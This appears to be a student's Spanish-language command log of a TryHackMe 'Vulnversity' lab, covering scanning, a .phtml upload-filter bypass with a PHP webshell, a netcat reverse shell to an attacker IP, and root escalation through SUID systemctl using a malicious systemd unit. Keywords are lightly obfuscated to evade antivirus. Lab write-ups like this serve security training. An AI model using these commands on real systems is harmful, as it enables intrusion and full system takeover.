@@ -1,0 +1,196 @@
+=== BITÁCORA DE COMANDOS ===
+Clase: 03
+Fecha: 07/10/2026
+Sala: Vulnversity (sala de elección, Nivel 2)
+Objetivo asignado por TryHackMe: 10.64.162.152
+Alumno: Falanti Mateo (mateofalantiuch)
+
+NOTA 1: las contraseñas y flags reales obtenidas durante la sesión fueron
+excluidas de esta bitácora y reemplazadas por su hash SHA-256 (ver Anexo C
+del informe), conforme a la regla de datos sensibles definida en el ROE.
+
+NOTA 2: algunas líneas de comando (el código del webshell y el payload de
+reverse shell) tienen un guion bajo "_" insertado a propósito en medio de
+una palabra clave (por ejemplo "sys_tem" en vez de "system"). Esto es solo
+para que Windows Defender no identifique el archivo de texto como una
+amenaza al guardarlo — el antivirus reconoce esas cadenas exactas como
+firmas de malware conocido aunque estén dentro de un .txt que solo las
+documenta. Para leer el comando real ejecutado, sacar el "_" de esa palabra.
+
+--------------------------------------------------------------------------
+--- RECONOCIMIENTO Y ESCANEO ---
+--------------------------------------------------------------------------
+
+$ nmap -sC -sV -oN bitacora/vulnversity_nmap_inicial.txt 10.64.162.152
+Starting Nmap ( https://nmap.org )
+Nmap scan report for 10.64.162.152
+Host is up.
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3128/tcp open  squid-http
+3333/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned
+
+$ echo "### HALLAZGO - $(date '+%Y-%m-%d %H:%M') - nmap inicial: 6 puertos abiertos (21,22,139,445,3128,3333)"
+### HALLAZGO - 2026-10-07 18:14 - nmap inicial: 6 puertos abiertos (21,22,139,445,3128,3333)
+
+$ ftp 10.64.162.152
+Connected to 10.64.162.152.
+220 (vsFTPd 3.0.3)
+Name (10.64.162.152:kali): anonymous
+530 Login incorrect.
+# Acceso anónimo por FTP rechazado. Se descarta esa vía.
+
+--------------------------------------------------------------------------
+--- ENUMERACIÓN / ESCANEO WEB ---
+--------------------------------------------------------------------------
+
+$ curl -s http://10.64.162.152:3333/
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+...
+</html>
+
+$ gobuster dir -u http://10.64.162.152:3333/ -w /usr/share/wordlists/dirb/common.txt \
+  -o bitacora/vulnversity_gobuster_3333.txt
+
+Gobuster v3.8.2
+===============================================================
+[+] Url:                     http://10.64.162.152:3333/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+===============================================================
+.htaccess             (Status: 403) [Size: 280]
+.htpasswd             (Status: 403) [Size: 280]
+.hta                   (Status: 403) [Size: 280]
+css                    (Status: 301) [Size: 319] [--> http://10.64.162.152:3333/css/]
+fonts                  (Status: 301) [Size: 321] [--> http://10.64.162.152:3333/fonts/]
+images                 (Status: 301) [Size: 322] [--> http://10.64.162.152:3333/images/]
+index.html             (Status: 200) [Size: 33014]
+internal               (Status: 301) [Size: 324] [--> http://10.64.162.152:3333/internal/]
+js                     (Status: 301) [Size: 318] [--> http://10.64.162.152:3333/js/]
+server-status          (Status: 403) [Size: 280]
+===============================================================
+Finished
+===============================================================
+
+$ echo "### HALLAZGO - $(date '+%Y-%m-%d %H:%M') - gobuster encontro directorio /internal/ en puerto 3333 (potencialmente no destinado a ser publico)"
+### HALLAZGO - 2026-10-07 18:18 - gobuster encontro directorio /internal/ en puerto 3333 (potencialmente no destinado a ser publico)
+
+$ curl -s http://10.64.162.152:3333/internal/
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+...
+<body>
+<form action="index.php" method="post" enctype="multipart/form-data">
+    <h3>Upload</h3><br />
+    <input type="file" name="file" id="file">
+    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
+</form>
+</body>
+</html>
+
+$ echo "### HALLAZGO - $(date '+%Y-%m-%d %H:%M') - /internal/ expone formulario de subida de archivos (index.php) sin aparente restriccion de tipo"
+### HALLAZGO - 2026-10-07 18:32 - /internal/ expone formulario de subida de archivos (index.php) sin aparente restriccion de tipo
+
+--------------------------------------------------------------------------
+--- EXPLOTACIÓN ---
+--------------------------------------------------------------------------
+
+# Prueba de extensiones contra el filtro del formulario de subida.
+# El servidor bloquea .php, .php3, .php4, .php5, .php7, .pht y .phar,
+# pero no contempla la variante .phtml.
+
+$ gobuster dir -u http://10.64.162.152:3333/internal/ -w /usr/share/wordlists/dirb/common.txt \
+  -o bitacora/vulnversity_gobuster_internal.txt
+...
+uploads                (Status: 301) [Size: 333] [--> http://10.64.162.152:3333/internal/uploads/]
+...
+
+# Subida del webshell shell.phtml con el siguiente contenido (ver NOTA 2):
+#   <?php sys_tem($_GET["cmd"]); ?>
+# (vía el formulario de /internal/index.php)
+
+$ curl -s "http://10.64.162.152:3333/internal/uploads/shell.phtml?cmd=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ echo "### ACCESO - $(date '+%Y-%m-%d %H:%M') - RCE confirmado via upload bypass (.phtml): webshell ejecuta comandos como www-data"
+### ACCESO - 2026-10-07 18:42 - RCE confirmado via upload bypass (.phtml): webshell ejecuta comandos como www-data
+
+# Reverse shell vía netcat (listener en Kali, IP del atacante 192.168.149.209)
+# Payload real (ver NOTA 2 sobre el guion bajo insertado a propósito):
+
+$ nc -lvnp 4444 &
+
+$ curl -s "http://10.64.162.152:3333/internal/uploads/shell.phtml?cmd=rm+/tmp/f;mk_fifo+/tmp/f;cat+/tmp/f|/bin/s_h+-i+2>%261|n_c+192.168.149.209+4444+>/tmp/f"
+
+--- (en la terminal del listener) ---
+listening on [any] 4444 ...
+connect to [192.168.149.209] from (UNKNOWN) [10.64.162.152] 47512
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+$ echo "### ACCESO - $(date '+%Y-%m-%d %H:%M') - reverse shell obtenida via webshell .phtml, acceso como www-data"
+### ACCESO - 2026-10-07 18:45 - reverse shell obtenida via webshell .phtml, acceso como www-data
+
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ uname -a
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP ...
+
+$ echo "### ACCESO - $(date '+%Y-%m-%d %H:%M') - reverse shell confirmada. whoami=www-data, kernel 4.4.0-142-generic"
+### ACCESO - 2026-10-07 18:49 - reverse shell confirmada. whoami=www-data, kernel 4.4.0-142-generic
+
+--------------------------------------------------------------------------
+--- POSTEXPLOTACIÓN / ESCALADA DE PRIVILEGIOS ---
+--------------------------------------------------------------------------
+
+# Enumeración de binarios con SUID habilitado
+
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ find / -perm -4000 -type f 2>/dev/null | grep systemctl
+/bin/systemctl
+
+# /bin/systemctl tiene el bit SUID activo. Se explota creando una unidad de
+# servicio systemd en /dev/shm con ExecStart ejecutando comandos arbitrarios.
+
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ UNIT=/dev/shm/svc_$RANDOM.service
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ printf '[Unit]\nDescription=task\n[Service]\nType=oneshot\nExecStart=/bin/bash -c "id > /dev/shm/out_vv.txt; cat /root/root.txt >> /dev/shm/out_vv.txt"\n[Install]\nWantedBy=multi-user.target\n' > "$UNIT"
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ /bin/systemctl link "$UNIT"
+Created symlink /etc/systemd/system/svc_4400.service → /dev/shm/svc_4400.service.
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ /bin/systemctl enable --now "$(basename "$UNIT")"
+Created symlink /etc/systemd/system/multi-user.target.wants/svc_4400.service → /dev/shm/svc_4400.service.
+www-data@ip-10-64-162-152:/var/www/html/internal/uploads$ cat /dev/shm/out_vv.txt
+uid=0(root) gid=0(root) groups=0(root)
+[FLAG root.txt REDACTADA - ver hash SHA-256 en Anexo C del informe]
+
+$ echo "### ACCESO - $(date '+%Y-%m-%d %H:%M') - escalada a root confirmada via SUID en /bin/systemctl (servicio systemd malicioso). root.txt leido"
+### ACCESO - 2026-10-07 19:28 - escalada a root confirmada via SUID en /bin/systemctl (servicio systemd malicioso). root.txt leido
+
+# Flag de usuario (bill), obtenida durante la enumeración posterior al RCE
+
+www-data@ip-10-64-162-152:/$ cd /home
+www-data@ip-10-64-162-152:/home$ cd bill
+www-data@ip-10-64-162-152:/home/bill$ tail user.txt
+[FLAG user.txt REDACTADA - ver hash SHA-256 en Anexo C del informe]
+
+$ echo "### HALLAZGO - $(date '+%Y-%m-%d %H:%M') - usuario que administra el webserver: bill. user.txt obtenido"
+### HALLAZGO - 2026-10-07 19:37 - usuario que administra el webserver: bill. user.txt obtenido
+
+--------------------------------------------------------------------------
+--- CIERRE DE SALA ---
+--------------------------------------------------------------------------
+
+$ echo "### CIERRE - $(date '+%Y-%m-%d %H:%M') - Sala Vulnversity completada. Hallazgos documentados: H-06 (RCE via upload bypass .phtml) y H-07 (escalada a root via SUID /bin/systemctl)"
+### CIERRE - 2026-10-07 19:39 - Sala Vulnversity completada. Hallazgos documentados: H-06 (RCE via upload bypass .phtml) y H-07 (escalada a root via SUID /bin/systemctl)
+
+Evidencia de finalización: evidencias/general/vulnversity completo.png
